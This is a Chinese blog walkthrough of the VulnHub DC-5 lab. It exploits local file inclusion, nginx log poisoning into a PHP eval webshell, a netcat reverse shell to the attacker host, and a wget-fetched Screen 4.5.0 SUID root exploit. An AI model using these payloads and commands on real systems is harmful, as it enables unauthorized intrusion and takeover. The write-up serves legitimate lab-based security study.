---
cover: /images/VulnHub.jpg
title: VulnHub DC-5 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - 提权
abbrlink: 8eb76005
date: 2026-03-14 12:00:00# VulnHub DC-5 靶机渗透测试笔记

> **靶机信息**
> - 靶机名称：DC-5
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐☆☆（中等）
> - 涉及技术：信息收集、文件包含漏洞（LFI）、日志污染、Webshell、Screen 4.5.0 SUID 提权

---

## 一、信息收集

### 1.1 主机发现

> **知识点：** `-sn` 是 Ping Scan（主机发现），不进行端口扫描。
> 作用：只探测目标主机是否存活，不扫描任何端口。
> **以前的写法是** `-sP`，新版 nmap 改成了 `-sn`，两者效果一样。

```bash
ifconfig
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image1.png)

```bash
nmap -sn 192.168.168.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image2.png)

还可以用 `arp-scan` 扫描，两者对比如下：

```bash
arp-scan -l
```

| 对比项 | arp-scan -l | nmap -sn |
|--------|-------------|----------|
| 扫描范围 | 仅本网段 | 本地+跨网段 |
| 速度 | 极快 | 较快 |
| 准确性 | 几乎100% | 可能被防火墙拦截 |
| 能否绕过防火墙 | ARP无法被过滤 | ICMP可能被屏蔽 |
| 获取信息 | IP+MAC+制造商 | IP+端口+系统 |

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image3.png)

**扫描结果**

- 192.168.168.1 → VM8 网卡
- 192.168.168.2 → 网关
- 192.168.168.128 → Kali 本机
- 192.168.168.169 → **靶机 DC-5**
- 192.168.168.254 → DHCP 服务器

### 1.2 端口与服务扫描

```bash
nmap -A -p- 192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image4.png)

- **80** → nginx 1.6.2（主要攻击面）
- **111** → rpcbind
- **53552** → RPC 状态

### 1.3 Web 信息收集

插件识别：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image5.png)

只有 Contact 页面有点功能：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image6.png)

---

## 二、漏洞发现

### 2.1 发现文件包含线索

留言板随便输入，提交后跳转到：

```
http://192.168.168.169//thankyou.php?firstname=1&lastname=1&country=canada&subject=1
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image7.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image8.png)

> 一直刷新发现下面的年份会改变

### 2.2 目录扫描

```bash
dirsearch -u http://192.168.168.169/
# 如果没有安装先执行
apt-get install dirsearch
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image9.png)

发现 `/footer.php`，这个页面刷新年份也会变：

```
http://192.168.168.169/footer.php
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image10.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image11.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image12.png)

> **猜测：** thankyou.php 包含了 footer.php 文件，存在文件包含漏洞。

### 2.3 验证文件包含漏洞（LFI）

尝试在 URL 中添加 `filename` 参数读取系统文件：

```
&filename=../../../../../etc/passwd
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image13.png)

成功读取！

---

## 三、文件包含漏洞原理

> **知识点：** 为什么要用 `../../../../../etc/passwd` 而不是直接 `/etc/passwd`？

**情况1：直接包含**
```php
include($_GET['file']);
// /etc/passwd ✅ 可以
// ../../../etc/passwd ✅ 也可以
```

**情况2：拼接了前缀**
```php
include("./files/" . $_GET['file']);
// /etc/passwd ✅ 可以（绝对路径会覆盖前缀）
// ../../../etc/passwd ✅ 也可以（跳出目录）
```

**情况3：拼接了后缀**
```php
include($_GET['file'] . ".php");
// /etc/passwd ❌ 变成 /etc/passwd.php
// ../../../etc/passwd ❌ 变成 ../../../etc/passwd.php
```

**建议跑的时候多加几个 payload：**
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

关于为什么判断是 Linux 系统读取 `/etc/passwd`，最常用的判断方法就是 Linux 对大小写敏感，Windows 不敏感：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image14.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image15.png)

---

## 四、参数爆破确认文件包含参数名

使用 fuzzDicts 字典爆破参数名：

```
fuzzDicts-master\paramDict\php.txt
```

很容易就爆破出来了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image16.png)

参数是 `file`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image17.png)

查看源代码看得更清楚。

也能用 wfuzz 跑，几乎瞬间出来：

```bash
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.168.169/thankyou.php?FUZZ=/etc/passwd
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image18.png)

---

## 五、日志污染 GetShell

> **思路：** 文件包含不能直接写文件，但 nginx 会把请求记录到日志，日志文件可以被包含执行。

日志文件路径：
```
/var/log/nginx/error.log
/var/log/nginx/access.log
```

直接提交会被编码，改用 Burp Suite 提交：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image19.png)

在 User-Agent 或请求中传入 PHP 代码：

```php
<?php phpinfo();?>
```

然后再通过文件包含访问 `/var/log/nginx/access.log`，可以看到成功执行了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image20.png)

改成 Webshell，用蚁剑连接：

```php
<?php eval($_POST['a']); ?>
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image21.png)

> 备注：环境崩了一次，重装了，IP 变成了 170。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image22.png)

查看 `/etc/passwd`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image23.png)

---

## 六、反弹 Shell

在靶机通过蚁剑执行：

```bash
nc -e /bin/bash 192.168.168.128 5566
# -e 就是执行的意思
```

Kali 监听：

```bash
nc -lvnp 5566
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image24.png)

升级为交互式终端：

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image25.png)

也没找到特别的用户：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image26.png)

---

## 七、提权

### 7.1 SUID 文件查找

```bash
find / -perm -4000 2>/dev/null
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image27.png)

找到一个可疑的 **screen 4.5.0**！

### 7.2 搜索 Screen 漏洞

```bash
searchsploit screen 4.5.0
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image28.png)

选第一个，找到文件地址：

```bash
find / -name 41154.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image29.png)

```
/usr/share/exploitdb/exploits/linux/local/41154.sh
```

### 7.3 传输并执行 Exp

上传文件有多种方式，可以在 Kali 上用 Python 开个 Web，然后在靶机上直接下载文件，也可以用蚁剑上传。

Kali 开启 HTTP 服务：

```bash
cd /usr/share/exploitdb/exploits/linux/local/
python3 -m http.server 8888
```

靶机下载并执行：

```bash
cd /tmp
wget http://192.168.168.128:8888/41154.sh
chmod 777 41154.sh
bash 41154.sh
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image30.png)

找到 flag：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-5_image31.png)

---

## 八、渗透流程总结

```
信息收集（nmap + arp-scan）
    ↓
发现 Contact 页面 → 提交表单跳转参数可控
    ↓
目录扫描发现 footer.php → 判断存在文件包含
    ↓
参数爆破确认参数名为 file → LFI 读取 /etc/passwd
    ↓
日志污染写入 PHP 代码 → 文件包含执行日志
    ↓
蚁剑连接 Webshell → 反弹 Shell
    ↓
SUID 查找发现 Screen 4.5.0 → 41154.sh 提权
    ↓
root → flag ✅
```

---

## 九、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| arp-scan | 局域网主机发现 |
| dirsearch | Web 目录扫描 |
| Wappalyzer | CMS/框架识别 |
| Burp Suite | 抓包、日志污染注入 |
| wfuzz | 参数爆破 |
| 蚁剑 | Webshell 管理工具 |
| nc | 反弹 Shell |
| searchsploit | 本地漏洞库搜索 |

---

> 本文为 VulnHub DC-5 靶机学习笔记，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
